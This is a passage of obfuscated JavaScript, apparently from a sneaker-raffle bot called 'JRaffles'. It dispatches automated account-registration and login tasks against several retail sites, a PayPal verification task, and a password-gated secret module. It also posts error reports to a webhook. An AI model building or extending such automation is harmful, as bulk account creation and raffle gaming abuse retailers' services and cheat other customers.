                                                _0x47d0ae['url'] = _0x51f7e5[_0x3d7cc9], console['log'](_0x4db3b7() + '\x20[' + _0x57d163[taskModule]['name'] + ']\x20Task\x20' + (_0x3d7cc9 + 0x1) + ':\x20Getting\x20Session'), await _0x4f98d3(_0x3d7cc9, 'ver', _0x47d0ae, null, _0x1ade66), console['log'](_0x4db3b7() + '\x20[' + _0x57d163[taskModule]['name'] + ']\x20Sleeping\x20for\x20' + _0x26509c['verificationDelay'] + '\x20ms'), await _0x5df609(_0x26509c['verificationDelay']);
                                            } catch (_0x1f07a8) {
                                                console['log'](_0x1f07a8), await _0x5df609(0x1388);
                                            }
                                            ;
                                        }
                                        ;
                                        return _0x356fd1();
                                    }
                                }
                                ;
                            } else {
                                if (_0x57d163[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x20330a(_0x57d163[taskModule]['modules']);
                                    var _0x47d0ae = _0x57d163[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await _0x50ac8a('https://bouncewear.com/nl/account/register', _0x47d0ae);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x57d163[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x20330a(_0x57d163[taskModule]['modules']);
                                        var _0x47d0ae = _0x57d163[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x1ade66 = await _0xf8063d(), _0x44e6be = await _0x1492c5();
                                            return await _0x1679b1('https://patta.nl/account/register', _0x47d0ae, _0x44e6be, _0x1ade66), _0x356fd1();
                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x1ade66 = await _0xf8063d(), _0x44e6be = await _0x1492c5();
                                                return await _0x243f6f('', _0x47d0ae, _0x44e6be, _0x1ade66), _0x356fd1();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x57d163[taskModule]['name'] == 'SLAM\x20JAM') {
                                            taskFunction = await _0x20330a(_0x57d163[taskModule]['modules']);
                                            var _0x47d0ae = _0x57d163[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x1ade66 = await _0xf8063d(), _0x37a29f = await _0x1492c5();
                                                return await _0x229917('https://slamjam.nl/account/register', _0x47d0ae, _0x37a29f, _0x1ade66), _0x356fd1();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x1ade66 = await _0xf8063d(), _0x37a29f = await _0x1492c5();
                                                    return await _0x568966('', _0x47d0ae, _0x37a29f, _0x1ade66), _0x356fd1();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x57d163[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x20330a(_0x57d163[taskModule]['modules']);
                                                var _0x47d0ae = _0x57d163[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x1ade66 = await _0xf8063d(), _0x16e2b8 = await _0x1492c5();
                                                    return await _0x4ca625('https://www.kickz.com/nl/login/', _0x47d0ae, _0x16e2b8, _0x1ade66), _0x356fd1();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x1ade66 = await _0xf8063d(), _0x16e2b8 = await _0x1492c5();
                                                        return await _0x3a6b0b(_0x47d0ae, _0x16e2b8, _0x1ade66), _0x356fd1();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x57d163[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x20330a(_0x57d163[taskModule]['modules']);
                                                    var _0x47d0ae = _0x57d163[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x1ade66 = await _0xf8063d(), _0x330232 = await _0x1492c5();
                                                        return await _0x4cf02e(_0x47d0ae, _0x330232, _0x1ade66), _0x356fd1();
                                                    }
                                                } else {
                                                    if (_0x57d163[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0x5df609(0x3e8), _0x356fd1();
                                                    else {
                                                        if (_0x57d163[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0x124e37 = _0x57d163[taskModule]['name'], _0x1ade66 = await _0xf8063d();
                                                            const _0x41167b = await _0x48d580();
                                                            var _0x51f7e5 = _0x41167b['split'](';');
                                                            await _0x45bbf9(_0x51f7e5, _0x124e37, _0x1ade66);
                                                        } else {
                                                            if (_0x57d163[taskModule]['name'] == 'Change\x20Settings') {
                                                                console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                var _0x1c1cd8 = 0x0;
                                                                for (const _0x30cdc8 in _0x26509c) {
                                                                    console['log']('(' + _0x1c1cd8 + ')\x20' + _0x30cdc8 + '\x20:\x20' + _0x26509c[_0x30cdc8]), _0x1c1cd8++;
                                                                }
                                                                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x1c1cd8 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                var _0x168310 = await _0x846247();
                                                                if (_0x168310 == _0x1c1cd8)
                                                                    return _0x356fd1();
                                                                console['clear'];
                                                                var _0x30f10a = 0x0;
                                                                for (var _0x507444 in _0x26509c) {
                                                                    if (_0x168310 == _0x30f10a) {
                                                                        console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x507444 + '\x20:'), _0x26509c[_0x507444] = await _0xb65080(), _0x2c62e3['writeFileSync']('../settings.json', JSON['stringify'](_0x26509c));
                                                                        break;
                                                                    } else
                                                                        _0x30f10a++;
                                                                }
                                                                return console['log']('Settings\x20Saved!'), await _0x5df609(0xbb8), _0x356fd1();
                                                            } else {
                                                                if (_0x57d163[taskModule]['name'] == 'Reload\x20Settings')
                                                                    return console['log']('Reloading\x20settings'), await _0xa05c8d(), _0x356fd1();
                                                                else {
                                                                    if (taskModule == 0x45) {
                                                                        _0x57d163[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                        var _0x11f5b2 = await _0x37642a();
                                                                        _0x11f5b2 == 'ModuleVoorDeBoys' ? (await _0x3e6c51(), await _0x558b2b(), await afewFunction(_0x2e2911[_0x217304], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x5df609(0xbb8));
                                                                    } else {
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            await _0x356fd1();
        } catch (_0x5a518c) {
            return console['log'](_0x5a518c), await _0x5df609(0x3a98);
        }
}
;
_0x2be893('JRaffles\x20' + _0x23a95c), _0xa05c8d();
try {
    _0x5a8ce2();
} catch (_0x1491e8) {
    var _0x1dd2f9 = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x136a13
            },
            {
                'name': 'Version',
                'value': '' + _0x23a95c
            },
            {
                'name': 'Error',
                'value': '' + _0x1491e8
            }
        ]
    }];
    const _0x30d3fc = { 'embeds': _0x1dd2f9 };
    _0x2ebaaf(_0x2664b3, _0x30d3fc);
}